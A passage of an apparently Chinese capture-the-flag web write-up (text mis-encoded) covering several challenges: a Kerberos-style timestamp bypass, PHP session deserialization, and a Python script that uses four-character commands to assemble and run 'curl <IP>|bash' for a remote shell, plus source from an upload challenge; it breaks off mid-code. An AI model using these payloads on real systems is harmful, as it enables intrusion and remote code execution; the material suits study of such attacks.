<h3 id="0x04-dooog"><a href="#0x04-dooog" class="headerlink" title="0x04 dooog"></a>0x04 dooog</h3><p>é¢˜ç›®å¾ˆç®€å•ï¼Œé€»è¾‘æ‹æ¸…æ¥šå°±è¡Œäº†ï¼Œä»clientå‡ºå‘ï¼Œå…ˆåå‘kdcçš„getTGTå’ŒgetTicketå‘åŒ…æ ¡éªŒï¼Œæ ¡éªŒé€šè¿‡åˆ™å‘åŒ…åˆ°cmdæ‰§è¡Œï¼Œæ‰§è¡Œæ²¡æœ‰å›æ˜¾ï¼Œä¸»è¦åœ¨getTicketä¸­çš„åˆ¤æ–­é™åˆ¶äº†cmdçš„å†…å®¹ï¼Œä¸è¿‡è®¤çœŸåˆ†æä¸€ä¸‹kdcæºç ï¼Œå¯ä»¥å‘ç°dataå˜é‡æ˜¯å¯æ§çš„ï¼Œæ§åˆ¶å‰ä¸€æ•°æ®åŒ…ä¸­çš„timestampä½¿å¾—int(time.time()) - data[â€˜timestampâ€™] &gt; 60å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥ä¿®æ”¹client app.py</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, session, flash</span><br><span class="line">from flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line">from form <span class="keyword">import</span> RegisterForm, CmdForm</span><br><span class="line">from toolkit <span class="keyword">import</span> AESCipher</span><br><span class="line"><span class="keyword">import</span> os, requests, json, time, base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">"SECRET_KEY"</span>] = os.urandom(<span class="number">32</span>)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/cmd'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def cmd():</span><br><span class="line">    form = CmdForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    elif request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.<span class="keyword">data</span></span><br><span class="line">            master_key = form.master_key.<span class="keyword">data</span></span><br><span class="line">            cmd = form.cmd.<span class="keyword">data</span></span><br><span class="line">            print(username,master_key,cmd)</span><br><span class="line">            cryptor = AESCipher(master_key)</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>:username, <span class="string">'timestamp'</span>: int(time.time())&#125;))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTGT'</span>, <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'authenticator'</span>: base64.b64encode(authenticator)&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            session[<span class="string">'session_key'</span>], session[<span class="string">'TGT'</span>] = cryptor.decrypt(base64.b64decode(res.content.split(<span class="string">'|'</span>)[<span class="number">0</span>])), res.content.split(<span class="string">'|'</span>)[<span class="number">1</span>]</span><br><span class="line">            flash(<span class="string">'GET TGT DONE'</span>)</span><br><span class="line">            #visit TGS</span><br><span class="line">            cryptor = AESCipher(session[<span class="string">'session_key'</span>])</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>: username, <span class="string">'timestamp'</span>: <span class="number">1</span>&#125;))</span><br><span class="line"></span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTicket'</span>,  <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'cmd'</span>: cmd, <span class="string">'authenticator'</span>: base64.b64encode(authenticator), <span class="string">'TGT'</span>: session[<span class="string">'TGT'</span>]&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'cmd error'</span>:</span><br><span class="line">                flash(<span class="string">'cmd not allow'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            flash(<span class="string">'GET Ticket DONE'</span>)</span><br><span class="line">            client_message, server_message = res.content.split(<span class="string">'|'</span>)</span><br><span class="line">            session_key = cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">            cryptor = AESCipher(session_key)</span><br><span class="line">            authenticator = base64.b64encode(cryptor.encrypt(username))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5002/cmd'</span>, <span class="keyword">data</span>=&#123;<span class="string">'server_message'</span>: server_message, <span class="string">'authenticator'</span>: authenticator&#125;)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>, flag=res.content)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/register'</span>, methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def register():</span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    elif request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.<span class="keyword">data</span></span><br><span class="line">            master_key = form.master_key.<span class="keyword">data</span></span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/register'</span>, <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'master_key'</span>: master_key&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'duplicate username'</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'register'</span>))</span><br><span class="line">            elif res.content != <span class="string">''</span> :</span><br><span class="line">                session[<span class="string">'id'</span>] = int(res.content)</span><br><span class="line">                flash(<span class="string">'register success'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=False, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°èµ·ä¸€ä¸ªæœåŠ¡æ¥å‘åŒ…å°±è¡Œäº†</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583723326867.png" alt>            </p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583723345340.png" alt>            </p>
<h3 id="0x05-sqlcheckin"><a href="#0x05-sqlcheckin" class="headerlink" title="0x05 sqlcheckin"></a>0x05 sqlcheckin</h3><p>è¿™é“é¢˜åŸé¢˜ï¼Œå°±ä¸å†™äº†ï¼Œè½¬<a href="https://gksec.com/HNCTF2019-Final.html#toc-sqlsql" target="_blank" rel="noopener">https://gksec.com/HNCTF2019-Final.html#toc-sqlsql</a></p>
<h3 id="0x06-Hackme"><a href="#0x06-Hackme" class="headerlink" title="0x06 Hackme"></a>0x06 Hackme</h3><p>è®¿é—®<a href="http://www.zipå¾—åˆ°é¢˜ç›®æºç ï¼Œä¸»è¦åœ¨äºprofile.php" target="_blank" rel="noopener">www.zipå¾—åˆ°é¢˜ç›®æºç ï¼Œä¸»è¦åœ¨äºprofile.php</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">session_save_path(<span class="string">'session'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span></span><br><span class="line"><span class="php">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $admin;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $sign;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;admin = $_SESSION[<span class="string">'admin'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;sign = $_SESSION[<span class="string">'sign'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="php">            redirect(<span class="string">'./core/index.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> info();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>æ„é€ ä¸€ä¸‹åºåˆ—åŒ–</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $admin;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $sign;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;admin = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;sign = <span class="string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="php">            redirect(<span class="string">'./core/index.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> info();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºï¼š<code>O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:0:&quot;&quot;;}</code>ä¿®æ”¹ä¸º<code>|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:0:&quot;&quot;;}</code>å‘é€åèŒƒå›´profileè¿›å…¥åˆ°/core/index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#hint : core/clear.php</span></span><br><span class="line">    $sandbox = <span class="string">'./sandbox/'</span> . md5(<span class="string">"Mrk@1xI^"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">        $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = parse_url($url);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span><br><span class="line">                    $code = file_get_contents($url);</span><br><span class="line">                    <span class="keyword">if</span> (strlen($code) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"invalid url"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'åªæœ‰ç®¡ç†å‘˜æ‰èƒ½çœ‹åˆ°æˆ‘å“Ÿ'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ€»ç»“èµ·æ¥å°±æ˜¯4å­—èŠ‚æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡é¦–å…ˆå¾—ç»•è¿‡ä¸€ä¸‹preg_matchï¼Œæ„é€ </p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">url</span>=compress.zlib://data:@<span class="number">127.0</span>.<span class="number">0.1</span>/plain<span class="comment">;base64,xxxx</span></span><br></pre></td></tr></table></figure>

<p>æ¥ç»•è¿‡åˆ¤æ–­ï¼Œä¹‹åå‚è€ƒ<a href="https://blog.csdn.net/qq_27446553/article/details/78502337" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/78502337</a> å››å­—ç¬¦getshellæ„é€ è„šæœ¬</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"># @Author: Cyc1e</span><br><span class="line"># @Date:   <span class="number">2020</span><span class="number">-03</span><span class="number">-09</span> <span class="number">13</span>:<span class="number">53</span>:<span class="number">34</span></span><br><span class="line"># @Last Modified by:   Cyc1e</span><br><span class="line"># @Last Modified time: <span class="number">2020</span><span class="number">-03</span><span class="number">-09</span> <span class="number">14</span>:<span class="number">18</span>:<span class="number">18</span></span><br><span class="line">#encoding=utf<span class="number">-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload = [</span><br><span class="line">    # å°† <span class="string">"g&gt; ht- sl"</span> å†™åˆ°æ–‡ä»¶ <span class="string">"v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    # å°†æ–‡ä»¶<span class="string">"v"</span>ä¸­çš„å­—ç¬¦ä¸²å€’åºï¼Œæ”¾åˆ°æ–‡ä»¶<span class="string">"x"</span>ï¼Œå°±å˜æˆäº† <span class="string">"ls -th &gt;g"</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    # generate `curl orange.tw.tw|python`</span><br><span class="line">    # generate `curl <span class="number">10.188</span><span class="number">.2</span><span class="number">.20</span>|bash`</span><br><span class="line">    <span class="string">'&gt;p\ '</span>,</span><br><span class="line">    <span class="string">'&gt;ph\\'</span>,</span><br><span class="line">    <span class="string">'&gt;a.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;E1\\'</span>,</span><br><span class="line">    <span class="string">'&gt;01\\'</span>,</span><br><span class="line">    <span class="string">'&gt;E8\\'</span>,</span><br><span class="line">    <span class="string">'&gt;31\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0x\\'</span>,#IPåœ°å€çš„<span class="number">16</span>è¿›åˆ¶</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,# getshell</span><br><span class="line">    <span class="string">'sh x'</span>,</span><br><span class="line">    <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload_all = <span class="string">'compress.zlib://data:@127.0.0.1/plain;base64,&#123;0&#125;'</span></span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>: <span class="string">'d1b8d083fa8c9bdb28317c30b103bbb6'</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">'http://121.36.222.22:88/core/clear.php'</span>,cookies=cookies)</span><br><span class="line">for i <span class="keyword">in</span> payload:</span><br><span class="line">    assert len(i) &lt;= <span class="number">20</span></span><br><span class="line">    r = requests.post(<span class="string">'http://121.36.222.22:88/core/index.php'</span>,cookies=cookies,data=&#123;<span class="string">"url"</span>:payload_all.format(base64.b64encode(i))&#125;)</span><br><span class="line">    print r.text</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309141741059.png" alt></p>
<h3 id="0x07-webct"><a href="#0x07-webct" class="headerlink" title="0x07 webct"></a>0x07 webct</h3><p>è®¿é—®<a href="http://www.zipæ‹¿åˆ°é¢˜ç›®æºç ï¼Œé¢˜ç›®æä¾›äº†ä¸¤ä¸ªé¡µé¢ï¼Œä¸€ä¸ªæ˜¯æµ‹è¯•æ•°æ®åº“è¿æ¥ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œåˆ†æä¸€ä¸‹æºç " target="_blank" rel="noopener">www.zipæ‹¿åˆ°é¢˜ç›®æºç ï¼Œé¢˜ç›®æä¾›äº†ä¸¤ä¸ªé¡µé¢ï¼Œä¸€ä¸ªæ˜¯æµ‹è¯•æ•°æ®åº“è¿æ¥ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œåˆ†æä¸€ä¸‹æºç </a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#testsql.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">$ip = $_POST[<span class="string">'ip'</span>];</span><br><span class="line">$user = $_POST[<span class="string">'user'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$option = $_POST[<span class="string">'option'</span>];</span><br><span class="line">$m = <span class="keyword">new</span> db($ip,$user,$password,$option);</span><br><span class="line">$m-&gt;testquery();</span><br></pre></td></tr></table></figure>

<p>æ•°æ®åº“è¿æ¥æµ‹è¯•æ¥æ”¶åˆ°æ•°æ®åå®ä¾‹åŒ–dbç±»è¿›è¡Œæµ‹è¯•è¿æ¥ï¼Œæ–‡ä»¶ä¸Šä¼ é¡µé¢æºç </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//var_dump($_FILES["file"]);</span></span></span><br><span class="line"><span class="php">$file = <span class="keyword">new</span> File($_FILES[<span class="string">"file"</span>]);</span></span><br><span class="line"><span class="php">$fileupload = <span class="keyword">new</span> Fileupload($file);</span></span><br><span class="line"><span class="php">$fileupload-&gt;deal();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"å­˜å‚¨çš„å›¾ç‰‡:"</span>.<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">$ls = <span class="keyword">new</span> Listfile(<span class="string">'./uploads/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $ls-&gt;listdir().<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>å„ä¸ªç±»çš„å®ç°ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $user;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $option;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip,$user,$password,$option)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user=$user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip=$ip;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;option=$option;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">testquery</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $m = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;ip,<span class="keyword">$this</span>-&gt;user,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">if</span>($m-&gt;connect_error)&#123;</span><br><span class="line">            <span class="keyword">die</span>($m-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $m-&gt;options(<span class="keyword">$this</span>-&gt;option,<span class="number">1</span>);</span><br><span class="line">        $result=$m-&gt;query(<span class="string">'select 1;'</span>);</span><br><span class="line">        <span class="keyword">if</span>($result-&gt;num_rows&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'æµ‹è¯•å®Œæ¯•ï¼Œæ•°æ®åº“æœåŠ¡å™¨å¤„äºå¼€å¯çŠ¶æ€'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'æµ‹è¯•å®Œæ¯•,æ•°æ®åº“æœåŠ¡å™¨æœªå¼€å¯'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uploadfile;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uploadfile=$filename;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">xs</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'è¯·æ±‚ç»“æŸ'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deal</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $extensionarr=<span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>);</span><br><span class="line">        $extension = pathinfo(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'name'</span>], PATHINFO_EXTENSION);</span><br><span class="line">        $type = <span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'type'</span>];</span><br><span class="line">        <span class="comment">//echo "type: ".$type;</span></span><br><span class="line">        $filetypearr=<span class="keyword">array</span>(<span class="string">"image/jpeg"</span>,<span class="string">"image/png"</span>,<span class="string">"image/gif"</span>);</span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$extensionarr)&amp;in_array($type,$filetypearr)&amp;<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"size"</span>]&lt;<span class="number">204800</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"é”™è¯¯ï¼š: "</span> .<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!is_dir(<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>))&#123;</span><br><span class="line">                    mkdir(<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $upload_dir=<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>;</span><br><span class="line">                move_uploaded_file(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"tmp_name"</span>],$upload_dir.md5(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'name'</span>]).<span class="string">"."</span>.$extension);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"ä¸Šä¼ æˆåŠŸ"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 